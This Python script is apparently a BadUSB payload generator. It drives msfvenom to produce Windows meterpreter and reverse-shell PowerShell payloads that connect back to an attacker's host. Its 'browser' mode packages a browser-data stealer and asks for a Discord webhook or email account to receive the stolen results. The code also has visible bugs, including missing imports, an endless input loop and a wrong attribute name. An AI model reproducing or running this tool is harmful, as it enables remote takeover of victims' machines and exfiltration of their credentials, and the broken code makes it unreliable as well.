#!/usr/bin/env python3
from subprocess import call, check_call
from os.path import exists
from argparse import ArgumentParser
from shutil import copyfile

argparser = ArgumentParser()
argparser.add_argument("-pt", "--payload_type", help="The type of payload to generate", type=str, choices=["meterpreter", "shell", "browser"])
argparser.add_argument("-pp", "--payload_path", help="The path of the payload. (Don't use extensions!)", type=str)
argparser.add_argument("-lh", "--lhost", help="The IP address to listen on.", type=str)
argparser.add_argument("-lp", "--lport", help="The port to listen on.", type=str)
argparser.add_argument("-a", "--auto", help="Automatically start listening.", action="store_true")
args = argparser.parse_args()

banner = """\033[94m
 _______                 __ __    __  ______  _______         ______           __   __             
|       \               |  |  \  |  \/      \|       \       /      \         |  \ |  \            
| $$$$$$$\ ______   ____| $| $$  | $|  $$$$$$| $$$$$$$\     |  $$$$$$\__    __ \$$_| $$_    ______ 
| $$__/ $$|      \ /      $| $$  | $| $$___\$| $$__/ $$_____| $$___\$|  \  |  |  |   $$ \  /      \\
| $$    $$ \$$$$$$|  $$$$$$| $$  | $$\$$    \| $$    $|      \$$    \| $$  | $| $$\$$$$$$ |  $$$$$$\\
| $$$$$$$\/      $| $$  | $| $$  | $$_\$$$$$$| $$$$$$$\\\$$$$$_\$$$$$$| $$  | $| $$ | $$ __| $$    $$\\
| $$__/ $|  $$$$$$| $$__| $| $$__/ $|  \__| $| $$__/ $$     |  \__| $| $$__/ $| $$ | $$|  | $$$$$$$$
| $$    $$\$$    $$\$$    $$\$$    $$\$$    $| $$    $$      \$$    $$\$$    $| $$  \$$  $$\$$     \\
 \$$$$$$$  \$$$$$$$ \$$$$$$$ \$$$$$$  \$$$$$$ \$$$$$$$        \$$$$$$  \$$$$$$ \$$   \$$$$  \$$$$$$$ \033[0m
"""

def generate_meterpreter(payload_path, LHOST, LPORT):
    """
    Generates a meterpreter payload
    """
    try:
        call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=" + LHOST, "LPORT=" + LPORT, "-f", "psh", "-o", payload_path])
    except FileNotFoundError or FileExistsError:
        print("[!] Could not find msfvenom. Please make sure it is installed and in your PATH!")
        exit(1)

def generate_shell(payload_path, LHOST, LPORT):
    """
    Generates a shell payload
    """
    try:
        call(["msfvenom", "-p", "windows/shell/reverse_tcp", "LHOST=" + LHOST, "LPORT=" + LPORT, "-f", "psh", "-o", payload_path])
    except FileNotFoundError or FileExistsError:
        print("[!] Could not find msfvenom. Please make sure it is installed and in your PATH!")
        exit(1)

def generate_browser(payload_path, LHOST, LPORT):
    """
    Generates a browser payload
    """

    if not exists("payloads"):
        Path("payloads").mkdir()
    
    if not exists("payloads/" + payload_path):
        Path("payloads/browser").mkdir()

    copyfile("templates/browser/hackbrowser.exe", "payloads/browser/hackbrowser.exe")
    copyfile("templates/browser/payload.ps1", "payloads/browser/payload.ps1")
    copyfile("templates/browser/inject.txt", "payloads/browser/inject.txt")


def generate_payload(payload_path, payload_type, LHOST, LPORT):
    """
    Generates a payload based on the payload_type
    """

    if payload_type == "meterpreter":
        generate_meterpreter(payload_path, LHOST, LPORT)
    elif payload_type == "shell":
        generate_shell(payload_path, LHOST, LPORT)
    elif payload_type == "browser":
        generate_browser(payload_path, LHOST, LPORT)
    else:
        print("[!] Invalid payload type")
        exit(1)

def InitArgs():
    if args.payload_path:
        payload_path = args.payload_path
    else:
        payload_path = "payload"

    if args.payload_type:
        payload_type = args.payload_type
    else:
        while True:
            payload_type = input("[?] What type of payload do you want to generate? (meterpreter, shell, browser): ").lower()
            if payload_type in ["meterpreter", "shell", "browser"]:
                break
            else:
                print("[!] Invalid payload type")

    if payload_type == "browser":
        while True:
            send_method = input("[?] Do you want to receive results as email or discord webhook? (e/W): ").lower()
        if send_method != "e":
            send_method = "webhook"
        else:
            send_method = "email"

    if send_method == "webhook":
        while True:
            webhook = input("[?] Enter the webhook URL: ")
            if (
                    webhook.startswith("https://discordapp.com/api/webhooks/") or 
                    webhook.startswith("https://discord.com/api/webhooks/") or 
                    webhook.startswith("https://canary.discordapp.com/api/webhooks/") or 
                    webhook.startswith("https://canary.discord.com/api/webhooks/")
                ):
                break
            else:
                print("[!] Invalid webhook URL")
    elif send_method == "email":
        print("[!] Using emails as a send method, you will need to enable insecure applications in your email provider.")
        while True:
            email = input("[?] Enter the email address: ")
            if "@" in email:
                break
            else:
                print("[!] Invalid email address")

            password = input("[?] Enter the password: ")

    if args.lhost:
        LHOST = args.lhost
    else:
        LHOST = input("[?] What IP address do you want to listen on? : ").lower()

    if args.lport:
        LPORT = args.port
    else:
        LPORT = input("[?] What port do you want to listen on? : ").lower()
    

    return payload_path, payload_type, LHOST, LPORT, send_method, webhook, email, password

def PrintBanner():
    print("\nDeveloped by GamehunterKaan. (https://pwnspot.com)")
    print("─" * 100)
    print(banner.center(100))
    print("─" * 100)
    print("I am not responsible if you are doing something illegal using this program! \n")

def check_msfvenom():
    try:
        call(["msfvenom"])
        return
    except FileNotFoundError:
        print("[!] Could not find msfvenom. Please make sure it is installed and in your PATH!")
    
    InstallMetasploit = input("[?] Do you want to install msfvenom? (y/n): ").lower()
    if InstallMetasploit == "n":
        return
    
    try:
        call(["sudo", "apt-get", "install", "metasploit-framework", "-y"], stderr=STDOUT)
        return
    except Exception as e:
        print("[!] Could not install metasploit using apt-get! Installing using nightly installer...")
    try:
        #split this command into a call command curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
        #nice job copilot, my only friend! :,>
        call(["curl", "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb", ">", "msfinstall"])
        call(["chmod", "755", "msfinstall"])
        call(["sudo", "./msfinstall"])
        return
    except Exception as e:
        print("[!] Could not install metasploit using nightly installer!")
        print("[!] Please install metasploit manually and try again!")
        print("[!] Error: " + str(e))
        exit(1)

def main():
    """
    Main function
    """
    PrintBanner()
    check_msfvenom()
    payload_path, payload_type, LHOST, LPORT, send_method, webhook, email, password = InitArgs()
    generate_payload(payload_path, payload_type, LHOST, LPORT)

    print("[+] Payload generated successfully!")
    print("[+] Payload path: payloads/%s/%s" % (payload_type, payload_path))

if __name__ == "__main__":
    main()
    exit(0)